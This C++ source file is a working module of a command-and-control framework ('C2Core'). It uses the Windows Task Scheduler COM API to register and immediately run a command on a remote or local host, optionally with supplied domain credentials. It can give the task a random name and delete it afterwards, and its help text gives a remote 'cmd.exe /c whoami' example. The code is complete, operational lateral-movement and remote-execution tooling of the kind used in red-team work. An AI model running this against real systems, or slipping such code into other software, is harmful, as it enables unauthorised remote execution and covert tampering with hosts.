#include "TaskScheduler.hpp"

#include "Common.hpp"

#include <sstream>
#include <iomanip>
#include <random>

#ifdef _WIN32
#include <windows.h>
#include <atlbase.h>
#include <comdef.h>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
using ATL::CComPtr;
#endif

using namespace std;

constexpr std::string_view moduleNameTaskScheduler = "taskScheduler";
constexpr unsigned long long moduleHashTaskScheduler = djb2(moduleNameTaskScheduler);

#ifdef _WIN32
extern "C" __declspec(dllexport) TaskScheduler* TaskSchedulerConstructor()
{
    return new TaskScheduler();
}
#else
extern "C" __attribute__((visibility("default"))) TaskScheduler* TaskSchedulerConstructor()
{
    return new TaskScheduler();
}
#endif

TaskScheduler::TaskScheduler()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleNameTaskScheduler), moduleHashTaskScheduler)
#else
    : ModuleCmd("", moduleHashTaskScheduler)
#endif
{
}

TaskScheduler::~TaskScheduler() = default;

std::string TaskScheduler::getInfo()
{
    std::ostringstream oss;
#ifdef BUILD_TEAMSERVER
    oss << "Task Scheduler 2.0 Module:\n";
    oss << "Create or run a scheduled task on a remote or local Windows host." << '\n';
    oss << "By default, the task is executed immediately after registration." << '\n';
    oss << "Options:" << '\n';
    oss << "  -s <server>           Target host (omit for localhost)." << '\n';
    oss << "  -t <taskName>         Name of the scheduled task. Defaults to a random name." << '\n';
    oss << "  -c <command>          Executable to run." << '\n';
    oss << "  -a <arguments>        Command line arguments." << '\n';
    oss << "  -u <user>             Optional DOMAIN\\user for registration." << '\n';
    oss << "  -p <password>         Password for the provided user." << '\n';
    oss << "  --no-run              Register the task without running it." << '\n';
    oss << "  --cleanup             Delete the task after it has been started." << '\n';
    oss << "Example:" << '\n';
    oss << "  taskScheduler -s HOST -t UpdateTask -c C:\\Windows\\System32\\cmd.exe -a \"/c whoami\"" << '\n';
#endif
    return oss.str();
}

std::string TaskScheduler::packParameters(const Parameters& params) const
{
    std::string packed;
    auto append = [&packed](const std::string& value)
    {
        packed.append(value);
        packed.push_back('\0');
    };

    append(params.server);
    append(params.taskName);
    append(params.command);
    append(params.arguments);
    append(params.username);
    append(params.password);
    append(params.skipRun ? "1" : "0");
    append(params.deleteAfterRun ? "1" : "0");
    return packed;
}

TaskScheduler::Parameters TaskScheduler::unpackParameters(const std::string& data) const
{
    Parameters params;
    std::vector<std::string> parts;
    size_t start = 0;
    while (start < data.size())
    {
        size_t end = data.find('\0', start);
        if (end == std::string::npos)
        {
            break;
        }
        parts.emplace_back(data.substr(start, end - start));
        start = end + 1;
    }

    if (parts.size() < 8)
    {
        return params;
    }

    params.server = parts[0];
    params.taskName = parts[1];
    params.command = parts[2];
    params.arguments = parts[3];
    params.username = parts[4];
    params.password = parts[5];
    params.skipRun = parts[6] == "1";
    params.deleteAfterRun = parts[7] == "1";
    return params;
}

int TaskScheduler::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    std::vector<std::string> args = regroupStrings(splitedCmd);
    Parameters params;

    if (args.size() < 2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    auto randomName = []()
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<int> dist(1000, 9999);
        std::ostringstream oss;
        oss << "C2Task_" << dist(gen);
        return oss.str();
    };

    params.taskName = randomName();

    for (size_t i = 1; i < args.size(); ++i)
    {
        const std::string& current = args[i];
        if (current == "-s" && i + 1 < args.size())
        {
            params.server = args[++i];
        }
        else if (current == "-t" && i + 1 < args.size())
        {
            params.taskName = args[++i];
        }
        else if (current == "-c" && i + 1 < args.size())
        {
            params.command = args[++i];
        }
        else if (current == "-a" && i + 1 < args.size())
        {
            params.arguments = args[++i];
        }
        else if (current == "-u" && i + 1 < args.size())
        {
            params.username = args[++i];
        }
        else if (current == "-p" && i + 1 < args.size())
        {
            params.password = args[++i];
        }
        else if (current == "--no-run")
        {
            params.skipRun = true;
        }
        else if (current == "--cleanup")
        {
            params.deleteAfterRun = true;
        }
        else if (!current.empty() && current[0] != '-')
        {
            // treat positional command if not provided via -c
            if (params.command.empty())
            {
                params.command = current;
            }
            else if (params.arguments.empty())
            {
                params.arguments = current;
            }
        }
    }

    if (params.command.empty())
    {
        c2Message.set_returnvalue("Missing command to execute.\n" + getInfo());
        return -1;
    }

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(packParameters(params));
#endif
    return 0;
}

int TaskScheduler::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    Parameters params = unpackParameters(c2Message.cmd());
    std::string result;

#ifdef _WIN32
    result = executeTask(params);
#else
    (void)params;
    result = "Task Scheduler technique is only supported on Windows.\n";
#endif

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);

    return 0;
}

int TaskScheduler::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
    errorMsg = c2RetMessage.returnvalue();
    return 0;
}

#ifdef _WIN32
namespace
{
    std::wstring toWide(const std::string& input)
    {
        if (input.empty())
        {
            return std::wstring();
        }
        int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, input.c_str(), static_cast<int>(input.size()), nullptr, 0);
        std::wstring wide(sizeNeeded, L'\0');
        MultiByteToWideChar(CP_UTF8, 0, input.c_str(), static_cast<int>(input.size()), wide.data(), sizeNeeded);
        return wide;
    }

    std::string formatHResult(HRESULT hr)
    {
        _com_error err(hr);
        std::ostringstream oss;
        oss << "HRESULT 0x" << std::hex << std::uppercase << hr << ": " << err.ErrorMessage();
        return oss.str();
    }
}

std::string TaskScheduler::executeTask(const Parameters& params) const
{
    std::ostringstream oss;

    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool needUninitialize = false;
    if (SUCCEEDED(hr))
    {
        needUninitialize = true;
    }
    else if (hr != RPC_E_CHANGED_MODE)
    {
        return "CoInitializeEx failed: " + formatHResult(hr) + "\n";
    }

    hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
                               RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                               RPC_C_IMP_LEVEL_IMPERSONATE,
                               nullptr, 0, nullptr);
    if (FAILED(hr) && hr != RPC_E_TOO_LATE)
    {
        if (needUninitialize)
        {
            CoUninitialize();
        }
        return "CoInitializeSecurity failed: " + formatHResult(hr) + "\n";
    }

    CComPtr<ITaskService> taskService;
    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, reinterpret_cast<void**>(&taskService));
    if (FAILED(hr))
    {
        if (needUninitialize)
        {
            CoUninitialize();
        }
        return "CoCreateInstance(CLSID_TaskScheduler) failed: " + formatHResult(hr) + "\n";
    }

    _variant_t serverVariant;
    if (!params.server.empty())
    {
        serverVariant = _variant_t(toWide(params.server).c_str());
    }

    _variant_t userVariant;
    _variant_t passwordVariant;
    if (!params.username.empty())
    {
        userVariant = _variant_t(toWide(params.username).c_str());
    }
    if (!params.password.empty())
    {
        passwordVariant = _variant_t(toWide(params.password).c_str());
    }

    hr = taskService->Connect(serverVariant, userVariant, passwordVariant, _variant_t());
    if (FAILED(hr))
    {
        if (needUninitialize)
        {
            CoUninitialize();
        }
        return "ITaskService::Connect failed: " + formatHResult(hr) + "\n";
    }

    CComPtr<ITaskFolder> rootFolder;
    hr = taskService->GetFolder(_bstr_t(L"\\"), &rootFolder);
    if (FAILED(hr))
    {
        if (needUninitialize)
        {
            CoUninitialize();
        }
        return "ITaskService::GetFolder failed: " + formatHResult(hr) + "\n";
    }

    CComPtr<ITaskDefinition> taskDefinition;
    hr = taskService->NewTask(0, &taskDefinition);
    if (FAILED(hr))
    {
        if (needUninitialize)
        {
            CoUninitialize();
        }
        return "ITaskService::NewTask failed: " + formatHResult(hr) + "\n";
    }

    CComPtr<IRegistrationInfo> regInfo;
    if (SUCCEEDED(taskDefinition->get_RegistrationInfo(&regInfo)))
    {
        regInfo->put_Author(_bstr_t(L"C2Core"));
        regInfo->put_Description(_bstr_t(L"Task created by C2Core TaskScheduler module."));
    }

    CComPtr<IPrincipal> principal;
    if (SUCCEEDED(taskDefinition->get_Principal(&principal)))
    {
        if (!params.username.empty())
        {
            principal->put_UserId(_bstr_t(toWide(params.username).c_str()));
            principal->put_LogonType(TASK_LOGON_PASSWORD);
        }
        else
        {
            principal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
        }
    }

    CComPtr<ITaskSettings> settings;
    if (SUCCEEDED(taskDefinition->get_Settings(&settings)))
    {
        settings->put_StartWhenAvailable(VARIANT_TRUE);
        settings->put_ExecutionTimeLimit(_bstr_t(L"PT0S"));
        settings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
        settings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
    }

    CComPtr<IActionCollection> actionCollection;
    hr = taskDefinition->get_Actions(&actionCollection);
    if (FAILED(hr))
    {
        if (needUninitialize)
        {
            CoUninitialize();
        }
        return "ITaskDefinition::get_Actions failed: " + formatHResult(hr) + "\n";
    }

    CComPtr<IAction> action;
    hr = actionCollection->Create(TASK_ACTION_EXEC, &action);
    if (FAILED(hr))
    {
        if (needUninitialize)
        {
            CoUninitialize();
        }
        return "IActionCollection::Create failed: " + formatHResult(hr) + "\n";
    }

    CComPtr<IExecAction> execAction;
    hr = action->QueryInterface(IID_IExecAction, reinterpret_cast<void**>(&execAction));
    if (FAILED(hr))
    {
        if (needUninitialize)
        {
            CoUninitialize();
        }
        return "IAction::QueryInterface(IID_IExecAction) failed: " + formatHResult(hr) + "\n";
    }

    hr = execAction->put_Path(_bstr_t(toWide(params.command).c_str()));
    if (FAILED(hr))
    {
        if (needUninitialize)
        {
            CoUninitialize();
        }
        return "IExecAction::put_Path failed: " + formatHResult(hr) + "\n";
    }

    if (!params.arguments.empty())
    {
        hr = execAction->put_Arguments(_bstr_t(toWide(params.arguments).c_str()));
        if (FAILED(hr))
        {
            if (needUninitialize)
            {
                CoUninitialize();
            }
            return "IExecAction::put_Arguments failed: " + formatHResult(hr) + "\n";
        }
    }

    CComPtr<IRegisteredTask> registeredTask;
    TASK_LOGON_TYPE logonType = params.username.empty() ? TASK_LOGON_INTERACTIVE_TOKEN : TASK_LOGON_PASSWORD;
    hr = rootFolder->RegisterTaskDefinition(_bstr_t(toWide(params.taskName).c_str()), taskDefinition,
                                            TASK_CREATE_OR_UPDATE,
                                            params.username.empty() ? _variant_t() : _variant_t(toWide(params.username).c_str()),
                                            params.password.empty() ? _variant_t() : _variant_t(toWide(params.password).c_str()),
                                            logonType,
                                            _variant_t(L""),
                                            &registeredTask);
    if (FAILED(hr))
    {
        if (needUninitialize)
        {
            CoUninitialize();
        }
        return "RegisterTaskDefinition failed: " + formatHResult(hr) + "\n";
    }

    oss << "Task " << params.taskName << " registered successfully." << '\n';

    if (!params.skipRun)
    {
        CComPtr<IRunningTask> runningTask;
        VARIANT empty = {};
        VariantInit(&empty);
        hr = registeredTask->Run(empty, &runningTask);
        if (FAILED(hr))
        {
            oss << "Run failed: " << formatHResult(hr) << '\n';
        }
        else
        {
            oss << "Task started." << '\n';
        }
        VariantClear(&empty);
    }

    if (params.deleteAfterRun)
    {
        HRESULT delHr = rootFolder->DeleteTask(_bstr_t(toWide(params.taskName).c_str()), 0);
        if (FAILED(delHr))
        {
            oss << "DeleteTask failed: " << formatHResult(delHr) << '\n';
        }
        else
        {
            oss << "Task deleted." << '\n';
        }
    }

    if (needUninitialize)
    {
        CoUninitialize();
    }
    return oss.str();
}
#endif
